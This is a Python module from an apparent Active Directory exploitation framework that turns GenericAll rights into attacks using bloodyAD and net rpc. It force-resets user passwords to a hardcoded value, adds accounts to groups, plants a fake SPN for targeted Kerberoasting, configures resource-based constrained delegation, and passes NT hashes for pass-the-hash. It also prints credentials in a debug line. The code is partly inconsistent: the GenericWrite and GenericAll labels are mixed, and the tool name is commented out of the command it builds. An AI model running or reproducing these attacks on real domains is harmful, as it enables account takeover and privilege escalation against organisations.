# strategies/generic_ all.py

from dataclasses import dataclass
from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_warning, print_done
from utils.runner import run_tool
from utils.platform import BACKEND
from utils.runner import run_tool, run_system_tool
from utils.cred_store import enrich_creds

@dataclass
class GenericAllStrategy(ExploitStrategy):
    # Attributes
    edge  : Edge

    @property
    def attacker(self) -> Node:
        return self.edge.source_node

    @property
    def target(self) -> Node:
        return self.edge.goal_node
    
    @property
    def victim(self) -> Node:
        return self.edge.source_node
    
    # Inherited Methods
    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.GENERIC_ALL # Generic_Write

    def exploit(self, creds: dict) -> ExploitResult: # Creds class?
        creds = {**creds, "username": _sam(self.attacker.label)}
        creds = enrich_creds(creds)
        if BACKEND.name == "none":
            raise HopFailedError(
                self.edge,
                "No backend available. Run: pip install bloodyAD  "
                "(or on Windows: wsl pip install bloodyAD)"
            )

        print_check(
            f"GenericWrite [{BACKEND.name}]: "
            f"{self.attacker.label} ──▶ {self.target.label}"
        )

        match self.target.kind:
            case NodeKind.GROUP:
                return self._add_member(creds)
            case NodeKind.USER:
                return self._force_change_password_hash(creds)
            case NodeKind.COMPUTER:
                return self._rbcd(creds)
            case _:
                raise HopFailedError(
                    self.edge,
                    f"GenericWrite on {self.target.kind.value} — no known technique"
                )
            
    def _force_change_password_hash(self, creds: dict) -> ExploitResult: # GENERICALL
        target_sam  = _sam(self.target.label)
        new_password = "AutoPwn@1337!"
		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
        ok, output = run_tool(_bloodyad(creds, [
    		"set", "password", target_sam, new_password
		]))
        # ok, output = run_tool(_bloodyad(creds, [
    	# 	"set", "password", target_sam, new_password
		# ]))
        if not ok:
            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword",
            edge=self.edge,
            success=True,
            notes=f"Administrator password reset to: {new_password}\n"
                  f"You can now use credentials:\n"
                  f"  Username: {target_sam}\n"
                  f"  Password: {new_password}\n"
                  f"  Domain: {creds['domain']}",
            gained_access={
                "username": target_sam,
                "password": new_password,
                "domain": creds.get("domain"),
                "dc_ip": creds.get("dc_ip")
            }
        )

    def _force_change_password(self, creds: dict) -> ExploitResult:
        target_sam  = _sam(self.target.label)
        new_password = "AutoPwn@1337!"
		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
        ok, output = run_system_tool([
            "net", "rpc", "password", target_sam, new_password,
            "-U", f"{creds['domain']}/{creds['username']}%{creds['password']}",
			"-S", creds["dc_ip"]
		])
        # ok, output = run_tool(_bloodyad(creds, [
    	# 	"set", "password", target_sam, new_password
		# ]))
        if not ok:
            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword",
            edge=self.edge,
            success=True,
            notes=f"Administrator password reset to: {new_password}\n"
                  f"You can now use credentials:\n"
                  f"  Username: {target_sam}\n"
                  f"  Password: {new_password}\n"
                  f"  Domain: {creds['domain']}",
            gained_access={
                "username": target_sam,
                "password": new_password,
                "domain": creds.get("domain"),
                "dc_ip": creds.get("dc_ip")
            }
        )
# bloodyAD set object <target> <attribute> <value>
    # ── Techniques ────────────────────────────────────────────────────────────

    def _add_member(self, creds: dict) -> ExploitResult:
        group_sam  = _sam(self.target.label)
        victim_sam = _sam(self.victim.label)

        ok, output = run_tool(_bloodyad(creds, [
            "add", "groupMember", group_sam, victim_sam
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"AddMember failed:\n{output}")

        print_done(f"{victim_sam} added to {group_sam}")
        return ExploitResult(success=True, output=output, technique="AddMember")

    def _targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = _sam(self.target.label)

        ok, output = run_tool(_bloodyad(creds, [
            "set", "object", target_sam,
            "servicePrincipalNames",
            f"fake/roast.{creds['domain']}"
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"SPN write failed:\n{output}")

        print_done(f"SPN set on {target_sam} — ready to Kerberoast")
        return ExploitResult(success=True, output=output, technique="TargetedKerberoast")

    def _rbcd(self, creds: dict) -> ExploitResult:
        target_sam   = _sam(self.target.label)
        attacker_sam = _sam(self.attacker.label)

        ok, output = run_tool(_bloodyad(creds, [
            "add", "rbcd", target_sam, attacker_sam
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"RBCD write failed:\n{output}")

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(success=True, output=output, technique="RBCD")


# ── Helpers ───────────────────────────────────────────────────────────────────

def _sam(label: str) -> str:
    return label.split("@")[0]


def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]: #creds maybe class?
    cmd = [
    #    "bloodyAD",
        "-H",     creds["dc_ip"],
        "-d",     creds["domain"],
        "-u",     creds["username"],
    ]
    if hashes := creds.get("hashes"):
		# hashes probably stored as ":52ff2a..." or just "52ff2a..."
        hash_value = hashes if hashes.startswith(":") else f":{hashes}"
        cmd += ["-p", hash_value]          # ← THIS IS THE KEY CHANGE
        cmd += ["-f", "rc4"]               # optional but safe for NT hash

    # === PASSWORD SUPPORT ===
    elif password := creds.get("password"):
        cmd += ["-p", password]
        
    full_cmd = cmd + subcommand
    print(f"DEBUG bloodyad cmd: {full_cmd}") 
    return cmd + subcommand